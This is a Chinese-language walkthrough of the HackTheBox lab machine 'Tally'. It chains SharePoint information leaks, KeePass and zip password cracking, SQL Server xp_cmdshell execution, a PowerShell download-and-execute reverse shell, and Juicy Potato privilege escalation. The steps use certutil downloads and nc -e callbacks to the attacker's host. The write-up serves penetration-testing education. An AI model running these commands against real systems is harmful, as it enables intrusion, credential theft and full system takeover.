Tally是一个困难的靶机，知识点涉及SharePoint信息收集、KeePass解密、密码破解、SQL
server命令执行、烂土豆内核提权等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2021-10-20
上午9.05.19](https://image.3001.net/images/20220330/1648634304_624429c00106aaccffbf4.png!small)

 _通关思维导图_  
![Tally](https://image.3001.net/images/20220330/1648634306_624429c2762205c70e434.png!small)

## 0x01 侦查

### 端口探测

首先通过nmap对目标进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.59 -oA nmap_Tally
    

![截屏2021-10-20
上午9.42.33](https://image.3001.net/images/20220330/1648634308_624429c49c52180c03881.png!small)  
![截屏2021-10-20
上午9.43.18](https://image.3001.net/images/20220330/1648634312_624429c898cd68a4cf384.png!small)  
![截屏2021-10-20
上午9.43.34](https://image.3001.net/images/20220330/1648634317_624429cd0a7cac7ae6082.png!small)  
扫描结果显示目标开放许多端口，包括21、80、81、135、139、445、1433等

#### 80端口

访问`http://10.10.10.59`，是 SharePoint 应用界面，它是 Microsoft Office
集成的用于文档管理、存储以及共享的web协作平台。  
![截屏2021-10-20
上午9.49.34](https://image.3001.net/images/20220330/1648634318_624429cedeada3798b339.png!small)

由于该站点的特殊性，我们可使用专门的 SharePoint 字典进行目录扫描

    
    
    gobuster dir -u http://10.10.10.59 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt
    

![截屏2021-10-20
上午10.02.34](https://image.3001.net/images/20220330/1648634319_624429cfe2c97904936b8.png!small)

成功扫描到两个文件：`/sitedirectory/_layouts/viewlsts.aspx`和`/shared
documents/forms/allitems.aspx`

### 信息收集

访问`viewlsts.aspx`，是 SharePoint 的站点文档管理界面。其中包含`Documents`、`Site Assets`、`Site
Pages`、`Site Library`这几个项目目录  
![截屏2021-10-20
上午10.08.41](https://image.3001.net/images/20220330/1648634321_624429d1136dcef869458.png!small)

在`Documents`下查看文件`ftp-details`，该文件名可说明里面存在ftp的详细内容  
![截屏2021-10-20
上午10.09.01](https://image.3001.net/images/20220330/1648634322_624429d246af5c34e5ce6.png!small)

文件内容如下，果不其然拿到主机名、工作组以及密码

    
    
    hostname: tally
    workgroup: htb.local
    password: UTDRSCH53c"$6hys
    Please create your own user folder upon logging in
    

在`Site Pages`下查看`Finance Team`  
![截屏2021-10-20
上午10.35.15](https://image.3001.net/images/20220330/1648634323_624429d35ff4f73acd214.png!small)

成功在信中找到登陆账号`ftp_user`  
![截屏2021-10-20
上午10.36.24](https://image.3001.net/images/20220330/1648634324_624429d4890e3c6281e35.png!small)

### ftp登陆

既然有了账号密码`ftp_user/UTDRSCH53c"$6hys`，那么我们可直接登录 ftp 服务

    
    
    ftp 10.10.10.59
    ftp > ls
    

![截屏2021-10-20
上午10.38.06](https://image.3001.net/images/20220330/1648634325_624429d58828294645649.png!small)

在 User 目录中发现多个用户文件夹，其中 Sarah 用户目录下存在 notes.txt

    
    
    ftp > cd User
    ftp > cd Sarah
    ftp > get notes.txt
    

![截屏2021-10-20
上午10.43.22](https://image.3001.net/images/20220330/1648634326_624429d6c2f484c59d60a.png!small)

成功下载 notes.txt，发现提示已完成事项：安装 SharePoint、待办事项：卸载 SQL server 2016

    
    
    cat notes.txt
    

![截屏2021-10-20
上午10.44.15](https://image.3001.net/images/20220330/1648634328_624429d891f1dece83c5a.png!small)

Tim 用户目录下则存在 tim.kdbx，kdbx为 Keepass 数据库，我们可对其进行密码破解

    
    
    ftp > cd User
    ftp > cd Tim
    ftp > cd Files
    ftp > get tim.kdbx
    

![截屏2021-10-20
上午10.46.08](https://image.3001.net/images/20220330/1648634329_624429d9f2d8b7fe565f2.png!small)

### KeePass密码破解

使用 keepss2john 将 kdbx 文件转换成可识别的哈希值

    
    
    keepass2john tim.kdbx > tim.hash
    

![截屏2021-10-20
上午10.51.26](https://image.3001.net/images/20220330/1648634331_624429dbef7007d24d6f1.png!small)

使用 john 进行哈希破解，但是一直没破解成功

    
    
    john tim.hash --wordlist=/usr/share/wordlists/rockyou.txt 
    

经过分析后发现原来是使用ftp下载文件时传输会导致部分文件信息丢失，在图中可以看到靶机中的原文件有 2222 bytes，但下载至本地后却只有 2220
bytes  
![截屏2021-10-20
下午2.20.11](https://image.3001.net/images/20220330/1648634333_624429dd2e64da85ce368.png!small)

由于ftp下载出错，因此我们可通过网页的方式将 tim.kdbx 下载至本地  
![截屏2021-10-20
下午2.24.36](https://image.3001.net/images/20220330/1648634334_624429de5530fbc82449b.png!small)

两者对比后大小发现确实相差 2 bytes  
![截屏2021-10-20
下午2.26.25](https://image.3001.net/images/20220330/1648634335_624429df81d083afbd946.png!small)

重新使用 hashcat 进行破解

    
    
    hashcat  -m 13400 tim.hash /usr/share/wordlists/rockyou.txt 
    

![截屏2021-10-20
下午2.33.35](https://image.3001.net/images/20220330/1648634336_624429e0e723532c4283f.png!small)

成功破解密码为`simplementeyo`，接下来使用 keepass2 打开它，输入密码后按`ctrl+h`显示其中内容

    
    
    keepass2 tim.kdbx
    

![截屏2021-10-20
下午2.37.05](https://image.3001.net/images/20220330/1648634340_624429e4da25670e99c74.png!small)  
获得smb共享路径为 ACCT，用户名为 Finance，密码为 Acc0unting

## 0x02 上线[sarah]

### smb登陆

使用以上账号密码`Finance/Acc0unting`借助 smbclient 登录smb服务

    
    
    smbclient \\\\10.10.10.59\\ACCT -U Finance
    

![截屏2021-10-20
下午2.39.52](https://image.3001.net/images/20220330/1648634342_624429e61f55bfea3359f.png!small)

在`\zz_Archived\SQL`下发现数据库连接配置文件：`conn-info.txt`

    
    
    smb > cd zz_Archived
    smb > cd SQL
    smb > ls
    smb > get conn-info.txt
    

![截屏2021-10-20
下午2.42.55](https://image.3001.net/images/20220330/1648634344_624429e8188ede02158e4.png!small)

查看文件后发现确实存在数据库连接信息，根据信息我们可知数据库类型为 SQL server，但可惜的是文本中已提示密码被修改  
![截屏2021-10-20
下午2.43.16](https://image.3001.net/images/20220330/1648634345_624429e9e8eebf262c2c5.png!small)

    
    
    db: sa
    pass: YE%TJC%&HYbe5Nw
    

### zip密码破解

在`\zz_Migration\Backup\20170808\orcharddb\`目录下发现zip压缩包文件：`orcharddb.zip`  
![截屏2021-10-20
下午2.46.33](https://image.3001.net/images/20220330/1648634347_624429eb60469525b4c7c.png!small)

由于下载后无法直接解压，因此需要使用 frackzip 对该zip文件进行密码破解

    
    
    fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt  orcharddb.zip 
    

![截屏2021-10-20
下午2.50.13](https://image.3001.net/images/20220330/1648634349_624429ed1bef67d933c68.png!small)  
成功破解密码为 Acc0unting，结果发现与登陆密码一致。通过 unzip 输入密码解压该 zip 文件

在解压出来的 sql 文件中发现账号密码为`admin/Finance2`，但根据之前的提示我们发现其实它是 Orchard CMS 的登陆信息，实际上
Orchard CMS 已经被替换为 SharePoint

    
    
    unzip orcharddb.zip
    

![截屏2021-10-20
下午2.52.07](https://image.3001.net/images/20220330/1648634350_624429ee8e63df8ef15d8.png!small)

### SQL server命令执行

在`\zz_Migration\Binaries\New folder\`目录中发现exe文件：`test.exe`  
![截屏2021-10-20
下午2.55.18](https://image.3001.net/images/20220330/1648634353_624429f10b47306c47e1d.png!small)

使用 strings 查看该程序，其中居然存在数据库的账号密码，为`sa/GWE3V65#6KFH93@4GWTG2G`

    
    
    strings tester.exe
    

![截屏2021-10-20
下午2.58.21](https://image.3001.net/images/20220330/1648634355_624429f39f88d8cc0ab99.png!small)

使用 spsh 通过以上账号密码连接 SQL server 数据库

    
    
    sqsh -S 10.10.10.59 -U sa
    

![截屏2021-10-20
下午3.07.31](https://image.3001.net/images/20220330/1648634356_624429f4aefd80ee663fd.png!small)

开启命令执行 xp_cmdshell

    
    
    # 查看相关参数
    SQL > EXEC SP_CONFIGURE N'show advanced options',1;
    SQL > go
    SQL > RECONFIGURE;
    SQL > go
    
    # 修改xp_cmdshell参数
    SQL > EXEC SP_CONFIGURE N'xp_cmdshell',1;
    SQL > go
    SQL > RECONFIGURE;
    SQL > go
    

通过 xp_cmdshell 查看用户和系统信息

    
    
    SQL > xp_cmdshell 'whoami'
    SQL > go
    SQL > xp_cmdshell 'cd c:\ & systeminfo'
    SQL > go
    

![截屏2021-10-20
下午3.32.50](https://image.3001.net/images/20220330/1648634358_624429f60ea12babd9545.png!small)  
![截屏2021-10-20
下午3.26.28](https://image.3001.net/images/20220330/1648634360_624429f80336dce64c4d2.png!small)  
由于该工具使用太过繁琐，我们可尝试使用 MSF 中的 mssql_exec 模块来进行数据库操作

### 反弹shell

首先使用 MSF 在本地开启监听

    
    
    msfconsole
    msf > use exploit/multi/script/web_delivery
    msf > set target 3
    msf > set lhost 10.10.14.3
    msf > set srvhost 10.10.14.3
    msf > set payload windows/meterpreter/reverse_tcp
    msf > exploit 
    

![截屏2021-10-20
下午3.45.57](https://image.3001.net/images/20220330/1648634361_624429f989767bfdc5a4b.png!small)

利用命令模块 mssql_exec 获取反弹shell，但是并没有收到反弹信息

    
    
    msfconsole
    msf > use auxiliary/admin/mssql/mssql_exec
    msf > set rhosts 10.10.10.59
    msf > set password GWE3V65#6KFH93@4GWTG2G
    msf > set cmd "regsvr\3\2 /s /n /u /i:http://10.10.14.3:8080/KZ9S4yvqHdmyO.sct scrobj.dll"
    msf > run
    

![截屏2021-10-20
下午3.47.06](https://image.3001.net/images/20220330/1648634365_624429fd4781640f01bd1.png!small)  
![截屏2021-10-20
下午3.59.00](https://image.3001.net/images/20220330/1648634368_62442a002dc9502d6ff0b.png!small)

于是切换 nishang 中的 Invoke-PowerShellTcp.ps1 脚本进行反弹

    
    
    cp /root/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1 . 
    

将反弹的地址和端口添加到该脚本下，同时开启 http 服务

    
    
    Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 5555
    

在本地监听5555端口

    
    
    nc -nvlp 5555
    

设置SQL语句使用之前的工具完成命令执行

    
    
    xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1')"
    

![截屏2021-10-20
下午4.07.07](https://image.3001.net/images/20220330/1648634369_62442a01617446c67d88c.png!small)

成功获取到反弹shell，在当前用户桌面寻找第一个flag

    
    
    dir C:\Users\Sarah\Desktop
    type C:\Users\Sarah\Desktop\user.txt
    type C:\Users\Sarah\Desktop\todo.txt
    

![截屏2021-10-20
下午4.09.51](https://image.3001.net/images/20220330/1648634370_62442a02c400ad854fb5d.png!small)  
成功拿到第一个flag，与此同时发现提示信息已完成：安装更新、查看防火墙是否可用；未完成：更新内网设计、更新服务器库存

## 0x03 权限提升[system]

### 信息收集

查看系统信息发现目标系统为 Windows Server 2016

    
    
    systeminfo
    

![截屏2021-10-20
下午4.12.19](https://image.3001.net/images/20220330/1648634373_62442a0510bba734e0c7c.png!small)

使用 Windows-Exploit-Suggester 查找相关漏洞，但是结果显示无法识别

    
    
    python windows-exploit-suggester.py --database 2021-05-18-mssb.xls  --systeminfo systeminfo.txt
    

![截屏2021-10-20
下午4.16.22](https://image.3001.net/images/20220330/1648634376_62442a0899a661202dfe1.png!small)

### 烂土豆提权

虽然无法获得内核提权建议，但是老方法 Juicy Potato 还是支持对 Windows Sever 2016 进行提权  
 **具体参考：https://github.com/ohpe/juicy-potato/tree/master/CLSID**  
![截屏2021-10-20
下午4.20.03](https://image.3001.net/images/20220330/1648634377_62442a09c7c378499e1eb.png!small)

在本地开启nc监听

    
    
    nc -nvlp 7777
    

传输 nc 和 JuicyPotato 并执行提权命令，结果显示似乎失败：没有权限进入

    
    
    cd c:\windows\temp
    certutil.exe -urlcache -f http://10.10.14.3/JuicyPotato.exe C:\WINDOWS\TEMP\JuicyPotato.exe
    
    certutil.exe -urlcache -f http://10.10.14.3/nc.exe C:\WINDOWS\TEMP\nc.exe
    C:\WINDOWS\TEMP\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\WINDOWS\TEMP\nc.exe -e cmd.exe 10.10.14.3 7777" -t *
    

![截屏2021-10-20
下午4.26.41](https://image.3001.net/images/20220330/1648634379_62442a0b709a0dcb98eb1.png!small)

于是切换到`C:\users\public`目录下再次执行

    
    
    cd C:\users\public
    certutil.exe -urlcache -f http://10.10.14.3/JuicyPotato.exe C:\users\public\JuicyPotato.exe
    
    certutil.exe -urlcache -f http://10.10.14.3/nc.exe C:\users\public\nc.exe
    C:\users\public\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\users\public\nc.exe -e cmd.exe 10.10.14.3 7777" -t *
    

![截屏2021-10-20
下午4.34.23](https://image.3001.net/images/20220330/1648634381_62442a0d4c2b59f508269.png!small)  
![截屏2021-10-20
下午4.34.39](https://image.3001.net/images/20220330/1648634383_62442a0f45ad2fb530001.png!small)

执行后成功拿到反弹shell，在管理员桌面上寻找第二个flag

    
    
    dir C:\Users\Administrator\Desktop
    type C:\Users\Administrator\Desktop\root.txt
    

![截屏2021-10-20
下午4.36.18](https://image.3001.net/images/20220330/1648634384_62442a10a95b7033c450e.png!small)  
成功拿到第二个flag

## 总结

在站点SharePoint中存在信息泄漏：文件中包含ftp账号和密码，通过该账号密码登陆ftp服务，在其中发现kdbx文件和提示信息，在使用ftp传输kdbx文件时出现问题，使用http协议下载该文件。使用hashcat破解KeePass密码，在kdbx数据库中发现存储的账号密码。通过该账号密码登陆smb服务，smb中包含许多干扰项：数据库连接文件、zip压缩文件，拿到的敏感信息都根据提示信息发现已无用。而突破点则是test.exe文件，通过string命令发现程序中内置数据库账号密码，这和CTF中的misc题型这么相似？通过拿到的数据库账号密码登陆SQL
server，借助xp_cmdshell命令执行拿到反弹shell，在靶机中经过信息收集发现靶机系统为Windows Server
2016，使用内核漏洞查询无果，尝试烂土豆可成功将权限提升至系统权限。

